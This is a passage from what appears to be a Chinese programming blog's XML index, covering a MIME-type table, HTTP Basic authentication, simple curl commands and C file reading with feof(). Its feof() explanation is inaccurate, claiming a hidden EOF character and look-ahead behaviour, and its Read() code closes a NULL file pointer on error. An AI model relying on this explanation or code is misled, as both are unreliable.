style="text-align:left">.htc</td><td style="text-align:left">text/x-component</td><td style="text-align:left">.htm</td><td style="text-align:left">text/html</td></tr><tr><td style="text-align:left">.html</td><td style="text-align:left">text/html</td><td style="text-align:left">.htt</td><td style="text-align:left">text/webviewhtml</td></tr><tr><td style="text-align:left">.htx</td><td style="text-align:left">text/html</td><td style="text-align:left">.icb</td><td style="text-align:left">application/x-icb</td></tr><tr><td style="text-align:left">.ico</td><td style="text-align:left">image/x-icon</td><td style="text-align:left">.ico</td><td style="text-align:left">application/x-ico</td></tr><tr><td style="text-align:left">.iff</td><td style="text-align:left">application/x-iff</td><td style="text-align:left">.ig4</td><td style="text-align:left">application/x-g4</td></tr><tr><td style="text-align:left">.igs</td><td style="text-align:left">application/x-igs</td><td style="text-align:left">.iii</td><td style="text-align:left">application/x-iphone</td></tr><tr><td style="text-align:left">.img</td><td style="text-align:left">application/x-img</td><td style="text-align:left">.ins</td><td style="text-align:left">application/x-internet-signup</td></tr><tr><td style="text-align:left">.isp</td><td style="text-align:left">application/x-internet-signup</td><td style="text-align:left">.IVF</td><td style="text-align:left">video/x-ivf</td></tr><tr><td style="text-align:left">.java</td><td style="text-align:left">java/*</td><td style="text-align:left">.jfif</td><td style="text-align:left">image/jpeg</td></tr><tr><td style="text-align:left">.jpe</td><td style="text-align:left">image/jpeg</td><td style="text-align:left">.jpe</td><td style="text-align:left">application/x-jpe</td></tr><tr><td style="text-align:left">.jpeg</td><td style="text-align:left">image/jpeg</td><td style="text-align:left">.jpg</td><td style="text-align:left">image/jpeg</td></tr><tr><td style="text-align:left">.jpg</td><td style="text-align:left">application/x-jpg</td><td style="text-align:left">.js</td><td style="text-align:left">application/x-javascript</td></tr><tr><td style="text-align:left">.jsp</td><td style="text-align:left">text/html</td><td style="text-align:left">.la1</td><td style="text-align:left">audio/x-liquid-file</td></tr><tr><td style="text-align:left">.lar</td><td style="text-align:left">application/x-laplayer-reg</td><td style="text-align:left">.latex</td><td style="text-align:left">application/x-latex</td></tr><tr><td style="text-align:left">.lavs</td><td style="text-align:left">audio/x-liquid-secure</td><td style="text-align:left">.lbm</td><td style="text-align:left">application/x-lbm</td></tr><tr><td style="text-align:left">.lmsff</td><td style="text-align:left">audio/x-la-lms</td><td style="text-align:left">.ls</td><td style="text-align:left">application/x-javascript</td></tr><tr><td style="text-align:left">.ltr</td><td style="text-align:left">application/x-ltr</td><td style="text-align:left">.m1v</td><td style="text-align:left">video/x-mpeg</td></tr><tr><td style="text-align:left">.m2v</td><td style="text-align:left">video/x-mpeg</td><td style="text-align:left">.m3u</td><td style="text-align:left">audio/mpegurl</td></tr><tr><td style="text-align:left">.m4e</td><td style="text-align:left">video/mpeg4</td><td style="text-align:left">.mac</td><td style="text-align:left">application/x-mac</td></tr><tr><td style="text-align:left">.man</td><td style="text-align:left">application/x-troff-man</td><td style="text-align:left">.math</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.mdb</td><td style="text-align:left">application/msaccess</td><td style="text-align:left">.mdb</td><td style="text-align:left">application/x-mdb</td></tr><tr><td style="text-align:left">.mfp</td><td style="text-align:left">application/x-shockwave-flash</td><td style="text-align:left">.mht</td><td style="text-align:left">message/rfc822</td></tr><tr><td style="text-align:left">.mhtml</td><td style="text-align:left">message/rfc822</td><td style="text-align:left">.mi</td><td style="text-align:left">application/x-mi</td></tr><tr><td style="text-align:left">.mid</td><td style="text-align:left">audio/mid</td><td style="text-align:left">.midi</td><td style="text-align:left">audio/mid</td></tr><tr><td style="text-align:left">.mil</td><td style="text-align:left">application/x-mil</td><td style="text-align:left">.mml</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.mnd</td><td style="text-align:left">audio/x-musicnet-download</td><td style="text-align:left">.mns</td><td style="text-align:left">audio/x-musicnet-stream</td></tr><tr><td style="text-align:left">.mocha</td><td style="text-align:left">application/x-javascript</td><td style="text-align:left">.movie</td><td style="text-align:left">video/x-sgi-movie</td></tr><tr><td style="text-align:left">.mp1</td><td style="text-align:left">audio/mp1</td><td style="text-align:left">.mp2</td><td style="text-align:left">audio/mp2</td></tr><tr><td style="text-align:left">.mp2v</td><td style="text-align:left">video/mpeg</td><td style="text-align:left">.mp3</td><td style="text-align:left">audio/mp3</td></tr><tr><td style="text-align:left">.mp4</td><td style="text-align:left">video/mpeg4</td><td style="text-align:left">.mpa</td><td style="text-align:left">video/x-mpg</td></tr><tr><td style="text-align:left">.mpd</td><td style="text-align:left">application/vnd.ms-project</td><td style="text-align:left">.mpe</td><td style="text-align:left">video/x-mpeg</td></tr><tr><td style="text-align:left">.mpeg</td><td style="text-align:left">video/mpg</td><td style="text-align:left">.mpg</td><td style="text-align:left">video/mpg</td></tr><tr><td style="text-align:left">.mpga</td><td style="text-align:left">audio/rn-mpeg</td><td style="text-align:left">.mpp</td><td style="text-align:left">application/vnd.ms-project</td></tr><tr><td style="text-align:left">.mps</td><td style="text-align:left">video/x-mpeg</td><td style="text-align:left">.mpt</td><td style="text-align:left">application/vnd.ms-project</td></tr><tr><td style="text-align:left">.mpv</td><td style="text-align:left">video/mpg</td><td style="text-align:left">.mpv2</td><td style="text-align:left">video/mpeg</td></tr><tr><td style="text-align:left">.mpw</td><td style="text-align:left">application/vnd.ms-project</td><td style="text-align:left">.mpx</td><td style="text-align:left">application/vnd.ms-project</td></tr><tr><td style="text-align:left">.mtx</td><td style="text-align:left">text/xml</td><td style="text-align:left">.mxp</td><td style="text-align:left">application/x-mmxp</td></tr><tr><td style="text-align:left">.net</td><td style="text-align:left">image/pnetvue</td><td style="text-align:left">.nrf</td><td style="text-align:left">application/x-nrf</td></tr><tr><td style="text-align:left">.nws</td><td style="text-align:left">message/rfc822</td><td style="text-align:left">.odc</td><td style="text-align:left">text/x-ms-odc</td></tr><tr><td style="text-align:left">.out</td><td style="text-align:left">application/x-out</td><td style="text-align:left">.p10</td><td style="text-align:left">application/pkcs10</td></tr><tr><td style="text-align:left">.p12</td><td style="text-align:left">application/x-pkcs12</td><td style="text-align:left">.p7b</td><td style="text-align:left">application/x-pkcs7-certificates</td></tr><tr><td style="text-align:left">.p7c</td><td style="text-align:left">application/pkcs7-mime</td><td style="text-align:left">.p7m</td><td style="text-align:left">application/pkcs7-mime</td></tr><tr><td style="text-align:left">.p7r</td><td style="text-align:left">application/x-pkcs7-certreqresp</td><td style="text-align:left">.p7s</td><td style="text-align:left">application/pkcs7-signature</td></tr><tr><td style="text-align:left">.pc5</td><td style="text-align:left">application/x-pc5</td><td style="text-align:left">.pci</td><td style="text-align:left">application/x-pci</td></tr><tr><td style="text-align:left">.pcl</td><td style="text-align:left">application/x-pcl</td><td style="text-align:left">.pcx</td><td style="text-align:left">application/x-pcx</td></tr><tr><td style="text-align:left">.pdf</td><td style="text-align:left">application/pdf</td><td style="text-align:left">.pdf</td><td style="text-align:left">application/pdf</td></tr><tr><td style="text-align:left">.pdx</td><td style="text-align:left">application/vnd.adobe.pdx</td><td style="text-align:left">.pfx</td><td style="text-align:left">application/x-pkcs12</td></tr><tr><td style="text-align:left">.pgl</td><td style="text-align:left">application/x-pgl</td><td style="text-align:left">.pic</td><td style="text-align:left">application/x-pic</td></tr><tr><td style="text-align:left">.pko</td><td style="text-align:left">application/vnd.ms-pki.pko</td><td style="text-align:left">.pl</td><td style="text-align:left">application/x-perl</td></tr><tr><td style="text-align:left">.plg</td><td style="text-align:left">text/html</td><td style="text-align:left">.pls</td><td style="text-align:left">audio/scpls</td></tr><tr><td style="text-align:left">.plt</td><td style="text-align:left">application/x-plt</td><td style="text-align:left">.png</td><td style="text-align:left">image/png</td></tr><tr><td style="text-align:left">.png</td><td style="text-align:left">application/x-png</td><td style="text-align:left">.pot</td><td style="text-align:left">application/vnd.ms-powerpoint</td></tr><tr><td style="text-align:left">.ppa</td><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left">.ppm</td><td style="text-align:left">application/x-ppm</td></tr><tr><td style="text-align:left">.pps</td><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left">.ppt</td><td style="text-align:left">application/vnd.ms-powerpoint</td></tr><tr><td style="text-align:left">.ppt</td><td style="text-align:left">application/x-ppt</td><td style="text-align:left">.pr</td><td style="text-align:left">application/x-pr</td></tr><tr><td style="text-align:left">.prf</td><td style="text-align:left">application/pics-rules</td><td style="text-align:left">.prn</td><td style="text-align:left">application/x-prn</td></tr><tr><td style="text-align:left">.prt</td><td style="text-align:left">application/x-prt</td><td style="text-align:left">.ps</td><td style="text-align:left">application/x-ps</td></tr><tr><td style="text-align:left">.ps</td><td style="text-align:left">application/postscript</td><td style="text-align:left">.ptn</td><td style="text-align:left">application/x-ptn</td></tr><tr><td style="text-align:left">.pwz</td><td style="text-align:left">application/vnd.ms-powerpoint</td><td style="text-align:left">.r3t</td><td style="text-align:left">text/vnd.rn-realtext3d</td></tr><tr><td style="text-align:left">.ra</td><td style="text-align:left">audio/vnd.rn-realaudio</td><td style="text-align:left">.ram</td><td style="text-align:left">audio/x-pn-realaudio</td></tr><tr><td style="text-align:left">.ras</td><td style="text-align:left">application/x-ras</td><td style="text-align:left">.rat</td><td style="text-align:left">application/rat-file</td></tr><tr><td style="text-align:left">.rdf</td><td style="text-align:left">text/xml</td><td style="text-align:left">.rec</td><td style="text-align:left">application/vnd.rn-recording</td></tr><tr><td style="text-align:left">.red</td><td style="text-align:left">application/x-red</td><td style="text-align:left">.rgb</td><td style="text-align:left">application/x-rgb</td></tr><tr><td style="text-align:left">.rjs</td><td style="text-align:left">application/vnd.rn-realsystem-rjs</td><td style="text-align:left">.rjt</td><td style="text-align:left">application/vnd.rn-realsystem-rjt</td></tr><tr><td style="text-align:left">.rlc</td><td style="text-align:left">application/x-rlc</td><td style="text-align:left">.rle</td><td style="text-align:left">application/x-rle</td></tr><tr><td style="text-align:left">.rm</td><td style="text-align:left">application/vnd.rn-realmedia</td><td style="text-align:left">.rmf</td><td style="text-align:left">application/vnd.adobe.rmf</td></tr><tr><td style="text-align:left">.rmi</td><td style="text-align:left">audio/mid</td><td style="text-align:left">.rmj</td><td style="text-align:left">application/vnd.rn-realsystem-rmj</td></tr><tr><td style="text-align:left">.rmm</td><td style="text-align:left">audio/x-pn-realaudio</td><td style="text-align:left">.rmp</td><td style="text-align:left">application/vnd.rn-rn_music_package</td></tr><tr><td style="text-align:left">.rms</td><td style="text-align:left">application/vnd.rn-realmedia-secure</td><td style="text-align:left">.rmvb</td><td style="text-align:left">application/vnd.rn-realmedia-vbr</td></tr><tr><td style="text-align:left">.rmx</td><td style="text-align:left">application/vnd.rn-realsystem-rmx</td><td style="text-align:left">.rnx</td><td style="text-align:left">application/vnd.rn-realplayer</td></tr><tr><td style="text-align:left">.rp</td><td style="text-align:left">image/vnd.rn-realpix</td><td style="text-align:left">.rpm</td><td style="text-align:left">audio/x-pn-realaudio-plugin</td></tr><tr><td style="text-align:left">.rsml</td><td style="text-align:left">application/vnd.rn-rsml</td><td style="text-align:left">.rt</td><td style="text-align:left">text/vnd.rn-realtext</td></tr><tr><td style="text-align:left">.rtf</td><td style="text-align:left">application/msword</td><td style="text-align:left">.rtf</td><td style="text-align:left">application/x-rtf</td></tr><tr><td style="text-align:left">.rv</td><td style="text-align:left">video/vnd.rn-realvideo</td><td style="text-align:left">.sam</td><td style="text-align:left">application/x-sam</td></tr><tr><td style="text-align:left">.sat</td><td style="text-align:left">application/x-sat</td><td style="text-align:left">.sdp</td><td style="text-align:left">application/sdp</td></tr><tr><td style="text-align:left">.sdw</td><td style="text-align:left">application/x-sdw</td><td style="text-align:left">.sit</td><td style="text-align:left">application/x-stuffit</td></tr><tr><td style="text-align:left">.slb</td><td style="text-align:left">application/x-slb</td><td style="text-align:left">.sld</td><td style="text-align:left">application/x-sld</td></tr><tr><td style="text-align:left">.slk</td><td style="text-align:left">drawing/x-slk</td><td style="text-align:left">.smi</td><td style="text-align:left">application/smil</td></tr><tr><td style="text-align:left">.smil</td><td style="text-align:left">application/smil</td><td style="text-align:left">.smk</td><td style="text-align:left">application/x-smk</td></tr><tr><td style="text-align:left">.snd</td><td style="text-align:left">audio/basic</td><td style="text-align:left">.sol</td><td style="text-align:left">text/plain</td></tr><tr><td style="text-align:left">.sor</td><td style="text-align:left">text/plain</td><td style="text-align:left">.spc</td><td style="text-align:left">application/x-pkcs7-certificates</td></tr><tr><td style="text-align:left">.spl</td><td style="text-align:left">application/futuresplash</td><td style="text-align:left">.spp</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.ssm</td><td style="text-align:left">application/streamingmedia</td><td style="text-align:left">.sst</td><td style="text-align:left">application/vnd.ms-pki.certstore</td></tr><tr><td style="text-align:left">.stl</td><td style="text-align:left">application/vnd.ms-pki.stl</td><td style="text-align:left">.stm</td><td style="text-align:left">text/html</td></tr><tr><td style="text-align:left">.sty</td><td style="text-align:left">application/x-sty</td><td style="text-align:left">.svg</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.swf</td><td style="text-align:left">application/x-shockwave-flash</td><td style="text-align:left">.tdf</td><td style="text-align:left">application/x-tdf</td></tr><tr><td style="text-align:left">.tg4</td><td style="text-align:left">application/x-tg4</td><td style="text-align:left">.tga</td><td style="text-align:left">application/x-tga</td></tr><tr><td style="text-align:left">.tif</td><td style="text-align:left">image/tiff</td><td style="text-align:left">.tif</td><td style="text-align:left">application/x-tif</td></tr><tr><td style="text-align:left">.tiff</td><td style="text-align:left">image/tiff</td><td style="text-align:left">.tld</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.top</td><td style="text-align:left">drawing/x-top</td><td style="text-align:left">.torrent</td><td style="text-align:left">application/x-bittorrent</td></tr><tr><td style="text-align:left">.tsd</td><td style="text-align:left">text/xml</td><td style="text-align:left">.txt</td><td style="text-align:left">text/plain</td></tr><tr><td style="text-align:left">.uin</td><td style="text-align:left">application/x-icq</td><td style="text-align:left">.uls</td><td style="text-align:left">text/iuls</td></tr><tr><td style="text-align:left">.vcf</td><td style="text-align:left">text/x-vcard</td><td style="text-align:left">.vda</td><td style="text-align:left">application/x-vda</td></tr><tr><td style="text-align:left">.vdx</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vml</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.vpg</td><td style="text-align:left">application/x-vpeg005</td><td style="text-align:left">.vsd</td><td style="text-align:left">application/vnd.visio</td></tr><tr><td style="text-align:left">.vsd</td><td style="text-align:left">application/x-vsd</td><td style="text-align:left">.vss</td><td style="text-align:left">application/vnd.visio</td></tr><tr><td style="text-align:left">.vst</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vst</td><td style="text-align:left">application/x-vst</td></tr><tr><td style="text-align:left">.vsw</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vsx</td><td style="text-align:left">application/vnd.visio</td></tr><tr><td style="text-align:left">.vtx</td><td style="text-align:left">application/vnd.visio</td><td style="text-align:left">.vxml</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.wav</td><td style="text-align:left">audio/wav</td><td style="text-align:left">.wax</td><td style="text-align:left">audio/x-ms-wax</td></tr><tr><td style="text-align:left">.wb1</td><td style="text-align:left">application/x-wb1</td><td style="text-align:left">.wb2</td><td style="text-align:left">application/x-wb2</td></tr><tr><td style="text-align:left">.wb3</td><td style="text-align:left">application/x-wb3</td><td style="text-align:left">.wbmp</td><td style="text-align:left">image/vnd.wap.wbmp</td></tr><tr><td style="text-align:left">.wiz</td><td style="text-align:left">application/msword</td><td style="text-align:left">.wk3</td><td style="text-align:left">application/x-wk3</td></tr><tr><td style="text-align:left">.wk4</td><td style="text-align:left">application/x-wk4</td><td style="text-align:left">.wkq</td><td style="text-align:left">application/x-wkq</td></tr><tr><td style="text-align:left">.wks</td><td style="text-align:left">application/x-wks</td><td style="text-align:left">.wm</td><td style="text-align:left">video/x-ms-wm</td></tr><tr><td style="text-align:left">.wma</td><td style="text-align:left">audio/x-ms-wma</td><td style="text-align:left">.wmd</td><td style="text-align:left">application/x-ms-wmd</td></tr><tr><td style="text-align:left">.wmf</td><td style="text-align:left">application/x-wmf</td><td style="text-align:left">.wml</td><td style="text-align:left">text/vnd.wap.wml</td></tr><tr><td style="text-align:left">.wmv</td><td style="text-align:left">video/x-ms-wmv</td><td style="text-align:left">.wmx</td><td style="text-align:left">video/x-ms-wmx</td></tr><tr><td style="text-align:left">.wmz</td><td style="text-align:left">application/x-ms-wmz</td><td style="text-align:left">.wp6</td><td style="text-align:left">application/x-wp6</td></tr><tr><td style="text-align:left">.wpd</td><td style="text-align:left">application/x-wpd</td><td style="text-align:left">.wpg</td><td style="text-align:left">application/x-wpg</td></tr><tr><td style="text-align:left">.wpl</td><td style="text-align:left">application/vnd.ms-wpl</td><td style="text-align:left">.wq1</td><td style="text-align:left">application/x-wq1</td></tr><tr><td style="text-align:left">.wr1</td><td style="text-align:left">application/x-wr1</td><td style="text-align:left">.wri</td><td style="text-align:left">application/x-wri</td></tr><tr><td style="text-align:left">.wrk</td><td style="text-align:left">application/x-wrk</td><td style="text-align:left">.ws</td><td style="text-align:left">application/x-ws</td></tr><tr><td style="text-align:left">.ws2</td><td style="text-align:left">application/x-ws</td><td style="text-align:left">.wsc</td><td style="text-align:left">text/scriptlet</td></tr><tr><td style="text-align:left">.wsdl</td><td style="text-align:left">text/xml</td><td style="text-align:left">.wvx</td><td style="text-align:left">video/x-ms-wvx</td></tr><tr><td style="text-align:left">.xdp</td><td style="text-align:left">application/vnd.adobe.xdp</td><td style="text-align:left">.xdr</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xfd</td><td style="text-align:left">application/vnd.adobe.xfd</td><td style="text-align:left">.xfdf</td><td style="text-align:left">application/vnd.adobe.xfdf</td></tr><tr><td style="text-align:left">.xhtml</td><td style="text-align:left">text/html</td><td style="text-align:left">.xls</td><td style="text-align:left">application/vnd.ms-excel</td></tr><tr><td style="text-align:left">.xls</td><td style="text-align:left">application/x-xls</td><td style="text-align:left">.xlw</td><td style="text-align:left">application/x-xlw</td></tr><tr><td style="text-align:left">.xml</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xpl</td><td style="text-align:left">audio/scpls</td></tr><tr><td style="text-align:left">.xq</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xql</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xquery</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xsd</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xsl</td><td style="text-align:left">text/xml</td><td style="text-align:left">.xslt</td><td style="text-align:left">text/xml</td></tr><tr><td style="text-align:left">.xwd</td><td style="text-align:left">application/x-xwd</td><td style="text-align:left">.x_b</td><td style="text-align:left">application/x-x_b</td></tr><tr><td style="text-align:left">.sis</td><td style="text-align:left">application/vnd.symbian.install</td><td style="text-align:left">.sisx</td><td style="text-align:left">application/vnd.symbian.install</td></tr><tr><td style="text-align:left">.x_t</td><td style="text-align:left">application/x-x_t</td><td style="text-align:left">.ipa</td><td style="text-align:left">application/vnd.iphone</td></tr><tr><td style="text-align:left">.apk</td><td style="text-align:left">application/vnd.android.package-archive</td><td style="text-align:left">.xap</td><td style="text-align:left">application/x-silverlight-app</td></tr></tbody></table></div><h2 id="7、HTTP-基本认证"><a href="#7、HTTP-基本认证" class="headerlink" title="7、HTTP 基本认证"></a>7、HTTP 基本认证</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供用户和密码的一种方式。详情请查看：<a href="https://zh.wikipedia.org/wiki/HTTP基本认证">https://zh.wikipedia.org/wiki/HTTP基本认证</a> 。</p><p>这一个典型的 HTTP 客户端和 HTTP 服务器的对话，服务器安裝在同一台计算机上（localhost）。包含以下步骤：</p><blockquote><ol><li>客户端请求一个需要身份认证的页面，但是没有提供用户名和密码。这通常是用户在地址栏输入一个 URL ， 或是打开了一个指向该页面的链接。</li><li>服务端响应一个 401 应答码，并提供一个认证域（ 英语：Access Authentication），头部字段为：<code>WWW-Authenticate</code> ，该字段为要求客户端提供适配的资源。<code>WWW-Authenticate：Basic realm = &quot;Secure Area&quot;</code> 该例子，<code>Basic</code> 为验证的模式，<code>realm = &quot;Secure Area&quot;</code> 为保护域，用于与其他请求 URI 作区别。</li><li>接到应答后，客户端显示该认证域给用户并提示输入用户名和密码。此时用户可以选确定或取消。</li><li>用户输入了用户名和密码后，客户端软件将对其进行处理，并在原先的请求上增加认证消息头（ 英语： Authorization ）然后重新发送再次尝试。过程如下：<ol><li>将用户名和密码拼接为 <code>用户:密码</code> 形式的字符串。</li><li>如果服务器 <code>WWW-Authenticate</code> 字段有指定编码，则将字符串编译成对应的编码（ 如：UTF-8）。</li><li>将字符串编码为 base64 。</li><li>拼接 <code>Basic</code> ，放入 <code>Authorization</code> 头字段，就像这样：<code>Authorization Basic 字符串</code> 。示例：用户名：<code>Aladdin</code> ，密码：<code>OpenSesame</code> ， 拼接后为 <code>Aladdin:OpenSesame</code> ，编码后 <code>QWxhZGRpbjpPcGVuU2VzYW1l</code> 。在 HTTP 头部里会是这样：<code>Authorization：Basic QWxhZGRpbjpPcGVuU2VzYW1l</code> 。Base64 编码并非加密算法，其无法保证安全与隐私，仅用于将用户名和密码中的不兼容的字符转化为均与 HTTP 协议兼容的字符集 。</li></ol></li><li>在本例中，服务器接受了该认证屏幕并返回了页面。如果用户凭据非法或无效，服务器可能再次返回 401 应答码，客户端可以再次提示用户输入密码 。</li></ol></blockquote><p>注意：客户端有可能不需要用户交互，在第一次请求中就发送认证消息头 。</p><h1 id="0x02-Curl-用法"><a href="#0x02-Curl-用法" class="headerlink" title="0x02 Curl 用法"></a>0x02 Curl 用法</h1><p><strong>curl 是一个和服务器交互信息（发送和获取信息）的命令行工具。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://www.xxx.com  <span class="hljs-comment">#查看HTTP响应头</span><br>curl -v http://www.xxx.com  <span class="hljs-comment">#查看交互过程;-v参数输出通信的整个过程，用于调试。</span><br><span class="hljs-comment">#当发起http请求时，curl会默认发起GET请求，也可以&quot;-X GET&quot;方式指定。</span><br>curl -X GET http://www.xxx.com  <span class="hljs-comment">#GET请求</span><br><span class="hljs-comment">#当使用POST请求方式，需要通过指定“-d”，向服务器传递数据。</span><br>curl -X POST http://www.xxx.com -d “参数”  <span class="hljs-comment">#POST请求</span><br></code></pre></td></tr></table></figure><h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.runoob.com/http/http-tutorial.html">HTTP 教程 | 菜鸟教程 (runoob.com)</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言文件操作</title>
    <link href="/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <url>/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言文件操作"><a href="#C语言文件操作" class="headerlink" title="C语言文件操作"></a>C语言文件操作</h1><h2 id="一次性读取文件全部内容"><a href="#一次性读取文件全部内容" class="headerlink" title="一次性读取文件全部内容"></a>一次性读取文件全部内容</h2><p>关键是获取文件的大小，知道文件大小就可以用<code>fread</code>一次读入内存中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">Read</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path,<span class="hljs-keyword">int</span> length)</span>   <span class="hljs-comment">//文件名称（文件路径）path、文件大小length</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *fp=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">char</span> *data=<span class="hljs-literal">NULL</span>;<br>    fp = fopen(path,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!fp)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;file open error !&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>        length = ftell(fp);<br>        rewind(fp);<br>        data = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>((length+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<br>        fread(data,<span class="hljs-number">1</span>,length,fp);<br>        data[length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    &#125;<br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>fseek()</code>定位到文件末尾，<code>ftell()</code>计算当前文件指针位置相对于文件首的偏移字节数，也就是文件的大小，最后用<code>rewind()</code>重新定位到文件开头位置，最后<code>fread()</code>读入。</p><h2 id="feof-原理和用法"><a href="#feof-原理和用法" class="headerlink" title="feof()原理和用法"></a>feof()原理和用法</h2><h3 id="一、feof-是什么？"><a href="#一、feof-是什么？" class="headerlink" title="一、feof()是什么？"></a>一、feof()是什么？</h3><p>feof()是检测流上的文件结束符的函数，如果文件结束，则返回非0值，否则返回0。一般在文件操作中经常使用feof()判断文件是否结束。</p><p>在C语言中，当我们使用与文件链接的流时，那么如何确定到文件末尾。 为了解决该问题，我们必须将整数值与EOF值进行比较。 通过feof()函数，我们确定文件的EOF是否发生。 未出现文件结尾时，它返回零值；否则返回1。</p><h3 id="二、feof-的原理"><a href="#二、feof-的原理" class="headerlink" title="二、feof()的原理"></a>二、feof()的原理</h3><h4 id="1、EOF"><a href="#1、EOF" class="headerlink" title="1、EOF"></a>1、EOF</h4><p>EOF是一个计算机术语，为End Of File的缩写，在操作系统中表示资料源无更多的资料可读取。资料源通常称为档案或串流。通常在文本的最后存在此字符表示资料结束。</p><p>这个定义的意思是，文档的结尾都有一个隐藏字符”EOF”，当程序读取它的时候，就会知道文件已经到达结尾。通常使用while循环加EOF判断作为读取结束的标志。</p><p>EOF 的值通常为 -1，但它依系统有所不同。</p><h4 id="2、feof"><a href="#2、feof" class="headerlink" title="2、feof()"></a>2、feof()</h4><p><strong>原型：</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">feof</span>(<span class="hljs-params">FILE* filename</span>)</span>;<br></code></pre></td></tr></table></figure><p>feof()的原理：<br>feof()函数，并不是通过读取到文件的EOF来评判，这个文件是否为空。<br>对feof()来说,它的工作原理是，站在光标所在位置，向后看看还有没有字符。如果有，返回0；如果没有，返回非0。它并不会读取相关信息，只是查看光标后是否还有内容。</p><h3 id="三、feof-的经典错误"><a href="#三、feof-的经典错误" class="headerlink" title="三、feof()的经典错误"></a>三、feof()的经典错误</h3><p>根据这个函数的定义，一般大家都是这样使用的，但是这样使用，文件中无论是否有内容，都会被判断为“文件不为空”。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *p;<br>    p = fopen(<span class="hljs-string">&quot;open.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (feof(p))<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;文件为空。&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;文件不为空。&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>直接使用时的错误分析：<br>对于一个空文件来说，当程序打开它的时候，它的光标会停在文件的开头，但是由于文件里什么内容都没有存（但是EOF是存在的），即整个文件就存贮了一个EOF。当程序打开文件，并直接调用feof()时，这个函数就会站在光标的位置向后张望，结果就看见了EOF，然后就当然返回0了。</p><h3 id="四、如何正确使用"><a href="#四、如何正确使用" class="headerlink" title="四、如何正确使用"></a>四、如何正确使用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 